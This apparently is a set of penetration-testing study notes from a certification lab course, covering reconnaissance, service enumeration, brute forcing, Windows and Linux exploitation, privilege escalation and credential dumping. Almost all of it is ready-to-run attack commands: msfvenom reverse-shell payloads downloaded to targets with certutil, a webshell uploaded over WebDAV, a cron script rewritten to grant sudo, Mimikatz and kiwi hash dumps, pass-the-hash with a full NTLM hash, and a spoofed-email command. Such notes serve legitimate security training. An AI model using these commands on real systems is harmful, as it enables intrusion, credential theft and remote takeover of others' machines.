


- Assessment methodologies
    
    - Information Gathering
        
        - Passive Information Gathering
            
            1. `host hackersploit.org`
            2. robots file - ****[https://hackersploit.org/robots.txt](https://hackersploit.org/robots.txt)
            3. site map - [https://hackersploit.org/sitemap_index.xml](https://hackersploit.org/sitemap_index.xml)
            4. Web tech - **Wappalyzer, built with** extensions
            5. `whatweb [hackersploit.org](<http://hackersploit.org>)`
            6. Download whole website - **HTTrack**
            7. **Who is**
            
            - `whois [hackersploit.org](<http://hackersploit.org>)`
            - `whois 172.64.32.93`
            - Sites : [who.is](http://who.is) [domaintools.com](http://domaintools.com)
            
            1. Website footprinting with **Netcraft** - **[https://sitereport.netcraft.com/?url=https%3A%2F%2Fhackersploit.org**](https://sitereport.netcraft.com/?url=https%3A%2F%2Fhackersploit.org**)
            2. **Dnsrecon**
            
            - `dnsrecon -d [hackersploit.org](<http://hackersploit.org/>)`
            - Site: [dnsdumpster.com](http://dnsdumpster.com)
            
            1. **WAF**
            
            - Download : ‣
            - `wafw00f [hackertube.net](<http://hackertube.net/>) -a`
            
            1. Subdomain Enumeration - **Sublist3r**
            
            - `sublist3r -d [hackersploit.com](<http://hackersploit.com/>) -o hs_sub_enum.txt`
            
            1. **Google dorks**
            
            - site:ine.com
            - site:ine.com employees
            - site:ine.com inurl:forum
            - site:*.ine.com
            - site:*.ine.com intitle:forum
            - site:*.ine.com filetype:pdf
            - inurl:auth_user_file.txt
            - inurl:passwd.txt
            - inurl:wp-config.bak
            
            1. waybackmachine
            2. **Email Harvesting**
            
            - `theHarvester -d [hackersploit.org](<http://hackersploit.org/>)`
            - `theHarvester -d [hackersploit.org](<http://hackersploit.org/>) -b google,linkedin,dnsdumpster,duckduckgo,crtsh`
            - `theHarvester -d [zonetransfer.me](<http://zonetransfer.me/>) -b all`
            
            1. Leaked Passwords database : [https://haveibeenpwned.com/](https://haveibeenpwned.com/)
        - Active Information Gathering
            
            1. DNS record & Zone Transfer `dnsenum [zonetransfer.me](<http://zonetransfer.me>)`
            2. Host discovery with Nmap
            
            - `cat /etc/hosts`
            - `nmap -sn 192.168.2.0/24`
            - `netdiscover -i eth0 -r 192.168.2.0/24`
            
            1. Port Scanning with nmap
            
            - `nmap 192.168.2.3`
            - `nmap -Pn 192.168.2.3`
            - `nmap -Pn -p- 192.168.2.3`
            - `nmap -Pn -p- -F -sU 192.168.2.3`
            - `nmap -p 80,44 192.168.2.3`
            - `nmap -p- -sV 192.168.2.3`
            - `nmap -sV -p- -O 192.168.2.3`
            - `nmap -Pn -F 192.168.2.3 -oN outputfile.txt`
    - Foot printing & Scanning
        
        1. Wireshark
        2. Arp scan `arp-scan -I eth1 192.168.31.0/24`
        3. Ping `ping 192.168.31.2`
        4. fping `fping -I eth1 -g 192.168.31.0/24 -a`
        5. nmap `nmap -sn 192.168.31.0/24`
        6. Zenmap - GUI of nmap
    - Enumeration
        
        - SMB
            
            SMB (**Server Message Block**) - a network file and resource sharing protocol, based on a client-server model. Usually SMB can be found on ports **139 or 445**
            
            **SMB nmap scripts**
            
            `nmap -p445 -sV -sC -O <TARGET_IP>`
            
            After finding SMB through port scanning, gather more information with nmap.
            
            - `nmap -p445 --script smb-protocols 10.2.24.25` - SMB Protocols
            - `nmap -p445 --script smb-security-mode 10.2.24.25` - SMB Security levels
            - `nmap -p445 --script smb-enum-sessions 10.2.24.25` - SMB logged in users
            - `nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - login admin default
            - `nmap -p445 --script smb-enum-shares 10.2.24.25` - SMB shares
            - `nmap -p445 --script smb-enum-users 10.2.24.25` - SMB users
            - `nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - SMB windows users
            - `nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Server statistics
            - `nmap -p445 --script smb-enum-domains--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - system domains
            - `nmap -p445 --script smb-enum-groups--script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Available groups
            - `nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - Services
            - `nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 10.2.24.25` - ls cmd
            
            **SMBMap**
            
            - `nmap -p445 --script smb-protocols 10.2.21.233`
            - `smbmap -u guest -p "" -d . -H 10.2.21.233`
            - `smbmap -u administrator -p smbserver_771 -d . -H 10.2.21.233` - Login
            - `smbmap -u administrator -p smbserver_771 -H 10.2.21.233 -x 'ipconfig’` - Running commands
            - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -L` - List all drives
            - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 -r 'C$’` - List directory contents
            - `smbmap -u admin -p password1 -H 192.174.58.3` - SMB shares using credentials
            - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --upload '/root/sample_backdoor' 'C$\\sample_backdoor’` - Upload file
            - `smbmap -u administrator -p 'smbserver_771' -H 10.2.21.233 --download 'C$\\flag.txt’` - Download a file
            
            **SMB Recon - Basics 1**
            
            - `nmap -sV -p 139,445 192.28.157.3`
            - `nmap --script smb-os-discovery -p 445 192.28.157.3` - SMB OS detection
            
            **rpcclient**
            
            It is a tool for executing client side MS-RPC functions
            
            - `nmap 192.230.128.3`
            - `rpcclient -U "" -N 192.230.128.3`
            - rpcclient $> `srvinfo`
            - rpcclient $> `enumdomusers` - users
            - rpcclient $> `enumdomgroups` - groups
            - rpcclient $> `lookupnames admin` - SID of user “admin” using rpcclient.
            
            **enum4linux** - tool for enumerating data from Windows and Samba hosts
            
            - `enum4linux -o 192.230.128.3`
            - `enum4linux -U 192.230.128.3` - users
            - `enum4linux -S 192.187.39.3` - shares
            - `enum4linux -G 192.187.39.3` - domain groups
            - `enum4linux -i 192.187.39.3` - Check if samba server is configured for printing
            - `enum4linux -r -u "admin" -p "password1" 192.174.58.3` - List users SUID
            
            **Metasploit**
            
            - `use auxiliary/scanner/smb/smb_version`
            - `use auxiliary/scanner/smb/smb_enumusers`
            - `use auxiliary/scanner/smb/smb_enumshares`
            - `use auxiliary/scanner/smb/pipe_auditor` - user cred: admin-password1
            
            **nmblookup**
            
            NetBIOS over TCP/IP client used to lookup NetBIOS names
            
            - `nmblookup -A 192.28.157.3`
            
            **smbclient**
            
            Ftp-like client to access SMB/CIFS resources on servers
            
            - `smbclient -L 192.28.157.3 -N`
            - `smbclient [//192.187.39.3/public](<https://192.187.39.3/public>) -N`
            - `smbclient -L 192.28.157.3 -U jane` - use “abc123” as password
            - `smbclient [//192.174.58.3/jane](<https://192.174.58.3/jane>) -U jane`
            - `smbclient [//192.174.58.3/admin](<https://192.174.58.3/admin>) -U admin` - use “password1” as password
            - `smb> get flag` - Important cat and type wont work in smb
            
            **Dictionary Attack**
            
            - `nmap -Pn -sV 192.174.58.3`
            - `msfconsole`
            - `use auxiliary/scanner/smb/smb_login`
            - `set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt`
            - `set SMBUser jane` - Known already specified in the lab description, will not be same in the exam
            - `set RHOSTS 192.174.58.3`
            - `exploit`
            
            **Hydra**
            
            - `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.174.58.3 smb`
        - FTP
            
            FTP (**File Transfer Protocol**) - a client-server protocol used to transfer files between a network using TCP/UDP connections. Default FTP port is **21**, opened when FTP is activated for sharing data.
            
            - `nmap -p21 -sV -sC -O 192.217.238.3`
            - Try Anonymous login `ftp 192.217.238.3` - failed
            - `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.217.238.3 -t 4 ftp`- hydra brute force
            - `nmap --script ftp-brute --script-args userdb=/root/users -p21 192.217.238.3` - nmap to brute password
            - `nmap --script ftp-anon -p21 192.119.169.3` - nmap anonymous login script
        - SSH
            
            SSH (**Secure Shell Protocol)** - a cryptographic network protocol for operating network services securely over an unsecured network, based on a client-server model. Default SSH TCP port is **22**.
            
            - `nmap -p22 -sV -sC -O 192.8.3.3`
            - `nc 192.8.3.3 22` - Banner grabbing
            - `ssh [root@192.8.3.3](<mailto:root@192.8.3.3>) 22`
            - `nmap --script ssh2-enum-algos 192.8.3.3` - nmap enum-alogo script
            - `nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.8.3.3` - nmap ssh hostkey script
            - `nmap -p22 --script ssh-auth-methods --script-args="ssh.user=student" 192.8.3.3` - nmap ssh auth method scripts
            - `ssh student@192.8.3.3`
            
            **Dictionary Attack**
            
            - `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.230.83.3 ssh`
            - `nmap -p22 --script=ssh-brute --script-args userdb=/root/users 192.230.83.3`
            - Msfconsole
                - `use auxiliary/scanner/ssh/ssh_login`
                - `set RHOSTS 192.230.83.3`
                - `set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt`
                - `set STOP_ON_SUCCESS true`
                - `set VERBOSE true`
                - `exploit`
        - HTTP
            
            HTTP (**Hyper Text Transfer Protocol**) - a client-server application layer protocol, used to load web pages using hypertext links. Default HTTP port is **80** and HTTPS port is **443.**
            
            - `nmap -p80 -sV -O 10.4.16.17`
            - `whatweb 10.4.16.17`
            - `http 10.4.16.17`
            - `dirb [<http://10.4.16.17>](<http://10.4.16.17/>)`
            - `browsh --startup-url <http://10.4.16.17/Default.aspx`>
            - `nmap --script=http-enum -sV -p80 10.4.21.207` - http enum nmap script
            - `nmap -sV -p 80 10.4.21.207 -script banner`
            - `nmap --script=http-methods --script-args http-methods.url-path=/webdav/ -p80 10.4.21.207` - http methods nmap script
            - `curl 192.199.232.3 | more` - curl cmd
            - `use auxiliary/scanner/http/brute_dirs` - Directory brute-force
            - `use auxiliary/scanner/http/http_version` - http version
            
            **HTTP Login**
            
            - `msfconsole`
            - `use auxiliary/scanner/http/http_login`
            - `set RHOSTS 192.199.232.3`
            - `set USER_FILE /tmp/users`
            - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
            - `set VERBOSE false`
            - `set AUTH_URI /dir/`
            - `exploit`
        - MYSQL
            
            MYSQL - an open-source relational database management system, used to add, access and process data stored in a server database using the SQL (Structured Query Language) syntax. It's also included in the LAMP technology stack (Linux, Apache, MySQL, PHP) to store and retrieve data in well-known applications, websites and services. Default MYSQL port is **3306**
            
            - `nmap -sV -p3306 192.49.51.3`
            - `mysql -h 192.49.51.3 -u root`
            - `mysql > show databases;`
            - `mydql> select load_file(”/etc/shadow”);`
            
            **Metasploit Enum**
            
            - `msfconsole`
                
            - `use auxiliary/scanner/mysql/mysql_schemadump` - schema dump
                
            - `set RHOSTS 192.49.51.3`
                
            - `set USERNAME root`
                
            - `set PASSWORD "”`
                
            - `exploit`
                
            - `use auxiliary/scanner/mysql/mysql_writable_dirs` - writable dirs
                
            - `set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt`
                
            - `set RHOSTS 192.49.51.3`
                
            - `set VERBOSE false`
                
            - `set PASSWORD "”`
                
            - `exploit`
                
            - `use auxiliary/scanner/mysql/mysql_file_enum` - File enum
                
            - `set RHOSTS 192.49.51.3`
                
            - `set FILE_LIST /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt`
                
            - `set PASSWORD "”`
                
            - `exploit`
                
            - `use auxiliary/scanner/mysql/mysql_hashdump` - hash dump
                
            - `set RHOSTS 192.49.51.3`
                
            - `set USERNAME root`
                
            - `set PASSWORD "”`
                
            - `exploit`
                
            
            **Nmap Scripts**
            
            - `nmap --script ms-sql-info -p1433 10.4.21.27`- Info
            - `nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -p1433 10.4.21.27` - ntlm info
            - `nmap --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt -p1433 10.4.21.27` - enumerate users and passwords
            - `nmap --script ms-sql-empty-password -p1433 10.4.21.27` - check empty password users
            - `nmap --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria -p1433 10.4.21.27` - Dump MSSQL users hashes
            - `nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" -p1433 10.4.21.27` cmd shell
            - `nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\\flag.txt" -p1433 10.4.21.27` - cmd shell
            
            **MYSQL Login**
            
            **Metasploit**
            
            - `nmap -sV -p3306 192.222.16.3`
            - `msfconsole`
            - `use auxiliary/scanner/mysql/mysql_login`
            - `set RHOSTS 192.222.16.3`
            - `set USERNAME root`
            - `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
            - `set VERBOSE false`
            - `set STOP_ON_SUCCESS true`
            - `exploit`
            
            **Hydra**
            
            - `hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.222.16.3 mysql`
            
            **MSSQL Enum with Metasploit port- 1433**
            
            - `nmap --script ms-sql-info -p1433 10.4.23.176`
                
            - `msfconsole`
                
            - `use auxiliary/scanner/mssql/mssql_login`
                
            - `set RHOSTS 10.4.23.176`
                
            - `set USER_FILE /root/Desktop/wordlist/common_users.txt`
                
            - `set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt`
                
            - `set VERBOSE false`
                
            - `exploit`
                
            - `use auxiliary/admin/mssql/mssql_enum`
                
            - `set RHOSTS 10.4.23.176`
                
            - `exploit`
                
            - `use auxiliary/admin/mssql/mssql_enum_sql_logins`
                
            - `set RHOSTS 10.4.23.176`
                
            - `exploit`
                
            - `use auxiliary/admin/mssql/mssql_exec`
                
            - `set RHOSTS 10.4.23.176`
                
            - `set CMD whoami`
                
            - `exploit`
                
            - `use auxiliary/admin/mssql/mssql_enum_domain_accounts`
                
            - `set RHOSTS 10.4.23.176`
                
            - `exploit`
                
        - SMTP
            
            SMTP (**Simple Mail Transfer Protocol)** - a communication protocol used for the transmission of email. Default SMTP TCP port is **25.**
            
            - `nmap -sV 192.63.243.3`
            - `nc 192.63.243.3 25` - banner grabbing
            - `telnet 192.63.243.3 25` - telnet
            - `smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t 192.63.243.3` - user enum
            - `use auxiliary/scanner/smtp/smtp_enum`
            - `sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s 192.63.243.3 -u Fakemail -m "Hi root, a fake mail from admin" -o tls=no` - send fake mail
    - Vulnerability Assessment
        
        1. CVE
        2. CVSS
        3. Case studies
        
        - Heartbleed `nmap -sV --script ssl-heartbleed -p 443 <TARGET>`
        - EthernalBlue `nmap --script smb-vuln-ms17-010 -p 445 <TARGET>`
        - BlueKeep
        - Log4j `nmap --script log4shell.nse --script-args log4shell.callback-server=<CALLBACK_SERVER_IP>:1389 -p 8080 <TARGET_HOST>`
        
        1. Exploit-db
        2. searchsploit
        3. Ref: Ref: [https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/4-va](https://blog.syselement.com/ine/courses/ejpt/assessment-methodologies/4-va)
- Host and Network Auditing
    
    1. Cyber security Basics
    2. CIA Traid
    3. Defense in Depth
    4. Compliance
    5. Frameworks & Maturity
    6. Auditing
    7. Asset management - Nmap & Nessus
- Host and Network Penetration Testing
    
    - System/Host based Attacks
        
        - Windows
            
            Windows has various standard native services and protocols configured or not on a host. When active, they provide an attacker with an access vector.
            
            Microsoft IIS - 80/443
            
            WebDAV - 80/443 [davtest, cadaver, msfvenom]
            
            SMB - 443 [psexec]
            
            RDP - 3389
            
            Winrm - 5986/443 [crackmapexec, evil-winrm]
            
            **Exploiting Windows Vulnerabilities**
            
            - Exploiting WebDAV
                
                Check wheather webDAV has been configured to run on the IIS web server
                
                Bruteforce the credentials for login
                
                Upload a malicious .asp file that can execute arbitary commands or obtain a reverse shell on the target
                
                Tools : Davtest, cadaver
                
                - `nmap -sV -sC 10.3.26.115`
                    
                - `nmap -p80 --script http-enum -sV 10.3.26.115`
                    
                - Browser [http://10.3.26.115/webdav/](http://10.3.26.115/webdav/) - Login check
                    
                - `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.3.26.115 http-get /webdav/`
                    
                - `davtest -url <http://10.3.26.115/webdav`>
                    
                - `davtest -auth bob:password_123321 -url <http://10.3.26.115/webdav`> - Find out which file can be submitted
                    
                - cadaver [http://10.3.26.115/webdav](http://10.3.26.115/webdav)
                    
                - dav:/webdav/> put /usr/share/webshells/asp/webshell.asp - file upload using cadaver
                    
                - Access the backdoor: [http://10.3.26.115/webdav/webshell.asp](http://10.3.26.115/webdav/webshell.asp) ****
                    
                - Now type your command on the box and run , find flag
                    
                    ```
                    WebDAV with Metasploit 
                    ```
                    
                - `nmap -p80 --script http-enum -sV 10.4.18.218`
                    
                - `davtest -auth bob:password_123321 -url <http://10.4.18.218/webdav`>
                    
                - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.80.4 LPORT=1234 -f asp > shell.asp`
                    
                - `cadaver <http://10.4.18.218/webdav`>
                    
                - `put /root/shell.asp`
                    
                - `service postgresql start && msfconsole`
                    
                - `use exploit/multi/handler`
                    
                - `set payload windows/meterpreter/reverse_tcp`
                    
                - `set LHOST 10.10.80.4`
                    
                - `set LPORT 1234`
                    
                - `run`
                    
                - Browser [http://10.4.18.218/webdav/shell.asp](http://10.4.18.218/webdav/shell.asp)
                    
                - Got meterpreter session > sysinfo,getuid
                    
            - Exploiting SMB with Psexec
                
                psexec is the lightweight telnet replacement developed by Microsoft. This allows you to execute processes on remote windows syatem using any users cred
                
                Psexec authentication is performed via SMB
                
                `nmap -sV -sC 10.4.16.36`
                
                `msfconsole`
                
                `search smb_login use auxiliary/scanner/smb/smb_login set RHOSTS 10.4.16.36 set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt set VERBOSE false exploit` - cred found
                
                [`psexec.py](<http://psexec.py/>) [Administrator@10.4.16.36](<mailto:Administrator@10.4.16.36>) cmd.exe`
                
                `msfconsole search psexec use exploit/windows/smb/psexec set RHOSTS 10.4.16.36 set SMBUser Administrator set SMBPass qwertyuiop exploit`
                
                EternalBlue Exploit
                
                `search eternalblue use exploit/windows/smb/ms17_010_eternalblue set RHOSTS 192.168.31.131 exploit`
                
            - Exploiting RDP
                
                `nmap -sV 10.4.18.131`
                
                `msfconsole`
                
                `use auxiliary/scanner/rdp/rdp_scanner set RHOSTS 10.4.18.131 set RPORT 3333 run` - detected RDP
                
                Bruteforce RDP login
                
                `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.4.18.131 -s 3333`
                
                `xfreerdp /u:administrator /p:qwertyuiop /v:10.4.18.131:3333`
                
            - Exploiting Winrm
                
                `nmap --top-ports 7000 10.4.30.175`
                
                `nmap -sV -p 5985 10.4.30.175`
                
                5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
                
                Bruteforce winrm `crackmapexec winrm 10.4.30.175 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
                
                `crackmapexec winrm 10.4.30.175 -u administrator -p tinkerbell -x "whoami" crackmapexec winrm 10.4.30.175 -u administrator -p tinkerbell -x "systeminfo"`
                
                get command shell `evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.4.30.175`
                
                Metasploit
                
                `search winrm_script use exploit/windows/winrm/winrm_script_exec set RHOSTS 10.4.30.175 set USERNAME administrator set PASSWORD tinkerbell set FORCE_VBS true exploit`
                
            
            **Windows Privilege Escalation**
            
            - Windows Kernal Exploits
                
                - Create payload `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=4444 -f exe -o payload.exe`
                - Start server python3 -m http.server
                - Download payload.exe
                - `msfconsole`
                - `use exploit/multi/handler`
                - `set payload windows/x64/meterpreter/reverse_tcp`
                - `set LHOST 192.168.31.128`
                - `set LPORT 4444`
                - `run`
                - Got meterpreter session , run in it background
                
                Another way - Use Windows Exploit Suggester
                
                `mkdir Windows-Exploit-Suggester cd Windows-Exploit-Suggester wget <https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py`>
                
                `cd Windows-Exploit-Suggester python ./windows-exploit-suggester.py --update pip install xlrd --upgrade`
                
                Go to meterpreter session and upload an file
                
                `cd C:\\\\ mkdir temp cd temp\\\\`
                
                `upload 41015.exe shell .\\41015.exe 7`
                
                Got system privilege :)
                
            - UAC Bypass
                
                - `nmap -sV -p 80 10.4.19.119`
                - Exploit rejetto
                - Got meterpreter
                - `getuid`
                - `pgrep explorer`
                - `migrate 2708`
                - `getprivs`
                - `shell`
                - `net user`
                - `net localgroup administrators`
                - Access denied
                - Use UACMe Akagmi already present on the attack machine
                - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.4.2 LPORT=1234 -f exe > backdoor.exe`
                - `use multi/handler`
                - `set payload windows/meterpreter/reverse_tcp`
                - `set LHOST 10.10.4.2`
                - `set LPORT 1234`
                - `run`
                - Go to old meterpreter session
                - `cd C:\\\\`
                - `mkdir Temp`
                - `cd Temp`
                - `upload /root/backdoor.exe`
                - `upload /root/Desktop/tools/UACME/Akagi64.exe`
                - `Akagi64.exe 23 C:\\Temp\\backdoor.exe` - run both
                - Now run getprivs
                - Got privilege escalation
                - Migrate to a `NT AUTHORITY\\SYSTEM` service
                - ps -S lsass.exe
                - migrate 692
                - hashdump
            - Access Token Impersonation
                
                - `nmap -sV -p 80 10.4.22.75`
                - exploit rejetto
                - got meterpreter session
                - `pgrep explorer`
                - `getuid`
                - `load incognito`
                - `list_tokens -u`
                - `impersonate_token "ATTACKDEFENSE\\Administrator”`
                - `prgerp explorer`
                - `getprivs`
                - `list_tokens -u`
                - `impersonate_token "NT AUTHORITY\\SYSTEM”`
                - `cd C:\\\\Users\\\\Administrator\\\\Desktop\\\\` - flag
            
            **Windows Credentials Dumping**
            
            - Unattented Files
                
                - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.4.2 LPORT=1234 -f exe > payload.exe - create payload`
                - python -m SimpleHTTPServer 80 - setup the web server and host the payload
                - `certutil -urlcache -f <http://10.10.4.2/payload.exe> payload.exe` - download the file to victim machine using certutil
                - `msfconsole -q`
                - `use multi/handler set payload windows/x64/meterpreter/reverse_tcp set LPORT 1234 set LHOST 10.10.4.2 run`
                - Execute the `payload.exe` on the Win target system and check the reverse shell on Kali
                - `cd C:\\\\Windows\\\\Panther`
                - `download unattend.xml`
                - open the unattend.xml file - found the admin password with base64 encode
                - Decode the password
                - Test the `administrator`:`Admin@123root` credentials with the `psexec` tool
                - [`psexec.py](<http://psexec.py/>) [administrator@10.4.19.9](<mailto:administrator@10.4.19.9>)`
                - `cd C:\\Users\\Administrator\\Desktop`
                - `type flag.txt`
            - Mimikatz & kiwi
                
                Mimikatz will require elevated privileges in order to run correctly
                
                - `nmap -sV -p 80 10.2.29.32`
                - Exploit badblue pattasu
                - Got meterpreter session
                - `sysinfo getuid pgrep lsass migrate 768`
                - **Hashdump - Kiwi**
                - `load kiwi`
                - `creds_all`
                - `lsa_dump_sam`
                - `lsa_dump_secrets`
                - **Hashdump Mimikatz**
                - `cd C:\\\\ mkdir Temp cd Temp` meterpreter > `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe` `shell`
                - `mimikatz.exe` - run mimikatz
                - `lsadump::sam`
                - `lsadump::secrets`
                - `sekurlsa::logonPasswords`
            - Pass the hash
                
                - `nmap -sV -p 80 10.2.23.202`
                - Exploit badblue pattasu
                - Got meterpreter session
                - `pgrep lsass migrate 772 getuid`
                - `load kiwi`
                - `lsa_dump_sam`
                - Copy and save the Administartor and students NTLM hashes
                - `hashdump`
                - LM+NTLM hash is necessary, so copy the string:
                - `background search psexec use exploit/windows/smb/psexec options`
                - `set LPORT 4422 set RHOSTS 10.2.23.202 set SMBUser Administrator set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d`
                - `exploit`
                - `getuid, sysinfo`
                - `crackmapexec smb 10.2.23.202 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "whoami”`
        - Linux
            
            - Exploiting Linux Vulnerabilities
                
                **Shellshock**
                
                - `nmap -sV 192.173.104.3`
                - Browse [http://192.173.104.3/gettime.cgi](http://192.173.104.3/gettime.cgi)
                - Vuln check - `nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.173.104.3`
                - `msfconsole`
                - `search shellshock use exploit/multi/http/apache_mod_cgi_bash_env_exec set RHOSTS 192.173.104.3 set TARGETURI /gettime.cgi exploit`
                
                **FTP**
                
                - `nmap -sV 192.209.45.3`
                - Bruteforce `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.209.45.3 -t 4 ftp`
                - `ftp 192.209.45.3`
                
                **SSH**
                
                - `nmap -sV 192.63.218.3`
                - Bruteforce `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.63.218.3 -t 4 ssh`
                - `ssh [sysadmin@192.63.218.3](<mailto:sysadmin@192.63.218.3>)`
                - `find / -name "flag”`
                - `cat /flag`
                
                **Samba**
                
                - `nmap -sV 192.34.128.3`
                - Bruteforce `hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.34.128.3 smb`
                - `smbmap -H 192.34.128.3 -u admin -p password1`
                - `smbclient -L 192.34.128.3 -U admin`
                - `smbclient [//192.34.128.3/shawn](<https://192.34.128.3/shawn>) -U admin`
                - `smbclient [//192.34.128.3/nancy](<https://192.34.128.3/nancy>) -U admin`
                - `enum4linux -a 192.34.128.3`
                - `enum4linux -a -u admin -p password1 192.34.128.3`
                - get flag
            - Linux Privilege Escalation
                
                **Cron jobs**
                
                - `whoami groups student cat /etc/passwd crontab -l`
                - `cd /`
                - `grep -rnw /usr -e "/home/student/message"`
                - `grep -rnw /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message`
                - `ls -al /usr/local/share/copy.sh`
                - `printf '#!/bin/bash\\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
                - `cat /usr/local/share/copy.sh`
                - `echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers`
                - `sudo -l`
                - `sudo su`
                - Got root priviledges
                - get the flag
                
                **SUID**
                
                - `pwd`
                - `la -al`
                - identify that welcome file have s binaries specifies
                - `find welcome`
                - `strings welcome`
                - `rm greetings cp /bin/bash greetings ./welcome`
                - `cd /root`
                - `cat flag`
            - Linux Credentials Dumping
                
                - `nmap -sV 192.75.64.3`
                - `service postgresql start && msfconsole -q`
                - `setg RHOSTS 192.75.64.3 search proftpd use exploit/unix/ftp/proftpd_133c_backdoor run`
                - `/bin/bash -i`
                - Upgrade the sessions to a `meterpreter` session
                - `sessions -u 1`
                - `sessions 2`
                - `cat /etc/shadow`
                - Gather Linux Password hashes with `Metasploit`
                - `search hashdump use post/linux/gather/hashdump set SESSION 2 run`
                - `search crack use auxiliary/analyze/crack_linux set SHA512 true run`
    - Network Based Attacks
        
        Tshark
        
        Filtering Basics HTTP
        
        ARP poisoning
        
        Wifi Traffic Analyses
        
    - MSF
        
        - Enumeration
            
            - FTP
                
                File Transfer Protocol -21
                
                `nmap -sV 10.10.10.10`
                
                `service postgresql start && msfconsole`
                
                `workspace -a FTP_ENUM`
                
                1. `use auxiliary/scanner/portscan/tcp`
                    
                2. `use auxiliary/scanner/ftp/ftp_login`
                    
                    `set RHOSTS 10.10.10.10`
                    
                    `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
                    
                    `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
                    
                    `run`
                    
                3. `use auxiliary/scanner/ftp/ftp_version`
                    
                4. `use auxiliary/scanner/ftp/anonymous`
                    
            - SMB
                
                Server Message Block - 139,445
                
                `service postgresql start && msfconsole`
                
                `workspace -a SMP_ENUM`
                
                1. `setg RHOSTS 10.10.10.10`
                    
                2. `use auxiliary/scanner/portscan/tcp`
                    
                3. `use auxiliary/scanner/smb/smb_version`
                    
                4. `use auxiliary/scanner/smb/smb_enumusers`
                    
                5. `use auxiliary/scanner/smb/smb_enumshares`
                    
                6. `use auxiliary/scanner/smb/smb_login`
                    
                    `set SMBUser admin`
                    
                    `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
                    
                    `run`
                    
                7. `smbclient -L \\\\\\\\10.10.10.10\\\\ -U admin`
                    
                8. `smbclient \\\\\\\\10.10.10.10\\\\public -U admin`
                    
            - Web Server (Apache)
                
                Apache - port 80,443
                
                1. `service postgresql start && msfconsole`
                    
                2. `workspace -a Web_Enum`
                    
                3. `setg RHOSTS 10.10.10.10`
                    
                4. `use auxiliary/scanner/http/http_version`
                    
                5. `use auxiliary/scanner/http/http_header`
                    
                6. `use auxiliary/scanner/http/robots_txt`
                    
                7. `use auxiliary/scanner/http/dir_scanner`
                    
                8. `use auxiliary/scanner/http/files_dir`
                    
                9. `use auxiliary/scanner/http/apache_userdir_enum`
                    
                    `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`
                    
                10. `use auxiliary/scanner/http/http_login`
